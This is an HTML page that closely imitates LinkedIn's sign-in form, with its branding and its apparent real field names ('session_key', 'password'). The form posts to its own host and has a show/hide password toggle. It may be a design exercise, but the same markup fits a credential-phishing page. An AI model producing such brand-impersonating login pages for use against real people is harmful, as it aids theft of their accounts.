<!DOCTYPE html><html lang="en"><head>
  <meta charset="UTF-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>LinkedIn Login Form</title>

  <!--Font Awesome-->
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous"/>

  <style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@100;300;400;500;700;900&display=swap');

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Roboto', sans-serif;
    }

    body {
      background: #f3f2ef;
    }

    .container {
      width: 320px;
      height: 500px;
      background: #fff;
      box-shadow: 0 10px 15px rgba(179, 179, 179, 0.7);
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      border-radius: 7px;
      display: flex;
      flex-direction: column;
      justify-content: space-evenly;
      padding: 1rem;
    }

    .container h2 {
      color: #0A66C3;
      font-size: 1.6rem;
    }

    .container h2 i {
      font-size: 1.8rem;
      padding-left: .1rem;
    }

    .text p {
      font-size: .8rem;
      padding-top: 0.3rem;
    }

    .input {
      position: relative;
      width: 100%;
      height: 50px;
      margin-bottom: 0.7em;
    }

    .your-input input {
      width: 100%;
      height: 50px;
      padding-top: 1.1rem;
      padding-left: 9px;
      outline: none;
      border: 1px solid #8c8c8c;
      border-radius: 3px;
      transition: .2s;
    }

    .your-input label {
      position: absolute;
      top: 30%;
      left: 10px;
      font-size: 1.1rem;
      color: #8c8c8c;
      transition: .2s;
    }

    .input input:focus~label,
    .input input:valid~label {
      top: 10%;
      font-size: .8rem;
      color: #000;
    }

    .input input:focus {
      border-width: 2px;
      border-color: #0A66C3;
    }

    .forgot-password-link {
      width: 140px;
      padding: .2rem;
      text-align: center;
      text-decoration: none;
      font-weight: bolder;
      color: #0A66C3;
      transition: .3s;
      border-radius: 12px;
    }

    .forgot-password-link:hover {
      background: rgba(10, 102, 195, 0.3);
    }

    button {
      height: 40px;
      width: 70px;
      background: #0A66C3;
      outline: none;
      border: none;
      border-radius: 30px;
      color: #fff;
      font-size: 1rem;
      font-weight: bolder;
      cursor: pointer;
    }

    .join-link {
      text-decoration: none;
      font-weight: bolder;
      color: #0A66C3;
    }

    .join-now {
      text-decoration: none;
      font-weight: bolder;
      color: #0A66C3;
      border-radius: 12px;
      transition: .3s;
      font-weight: bolder;
      padding: .2rem;
    }

    .join-now:hover {
      background: rgba(10, 102, 195, 0.3);
    }

    .toggle-password {
      position: absolute;
      right: 12px;
      top: 35%;
      cursor: pointer;
      font-size: 0.9rem;
      color: #0A66C3;
      user-select: none;
    }
  </style>
</head>

<body>
  <div class="container">
    <h2>Linked<span><i class="fab fa-linkedin"></i></span></h2>
    <div class="text">
      <h1>Sign in</h1>
      <p>Stay updated on your professional world</p>
    </div>

    <!-- Modified form to POST like the 2nd code -->
    <form method="POST" action="" class="your-input">
      <div class="input">
        <input type="text" name="session_key" id="email" required=""/>
        <label for="email">Email or Phone</label>
      </div>

      <div class="input">
        <input type="password" name="password" id="password" required=""/>
        <label for="password">Password</label>
        <span id="toggle-password" class="toggle-password">show</span>
      </div>

      <a href="#" class="forgot-password-link">Forgot Password?</a>

      <button type="submit">Sign in</button>
    </form>

    <p class="join-link">
      New to LinkedIn?
      <a href="#" class="join-now">Join now</a>
    </p>
  </div>

  <script>
    // Password show/hide toggle like in 2nd code
    document.getElementById('toggle-password').addEventListener('click', function () {
      const passwordInput = document.getElementById('password');
      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        this.textContent = 'hide';
      } else {
        passwordInput.type = 'password';
        this.textContent = 'show';
      }
    });
  </script>



</body></html>
